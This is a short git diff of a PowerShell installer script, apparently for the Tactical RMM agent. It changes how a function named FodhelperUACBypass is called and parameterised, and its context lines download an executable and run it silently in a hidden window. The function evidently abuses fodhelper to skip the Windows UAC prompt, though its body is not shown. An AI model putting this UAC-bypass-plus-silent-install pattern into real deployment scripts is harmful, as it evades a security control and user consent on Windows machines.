@@ -58,7 +58,7 @@ If (Get-Service $serviceName -ErrorAction SilentlyContinue) {
             #Start-Sleep -s 5
             #Start-Process -FilePath "C:\Program Files\TacticalAgent\tacticalrmm.exe" -ArgumentList $installArgs -Wait
 
-            FodhelperUACBypass
+            FodhelperUACBypass -program="cmd /c start C:\Windows\System32\cmd.exe" #default
             
             Invoke-WebRequest -Uri $downloadlink -OutFile $OutPath\$output
             Start-Process -FilePath $OutPath\$output -ArgumentList '/VERYSILENT', '/SUPPRESSMSGBOXES' -WindowStyle Hidden -Wait
@@ -88,7 +88,7 @@ If (Get-Service $serviceName -ErrorAction SilentlyContinue) {
 function FodhelperUACBypass(){ 
  Param (
            
-        [String]$program = "cmd /c start C:\Windows\System32\cmd.exe" #default
+        [String]$program 
        )
 　
     #Create Registry Structure
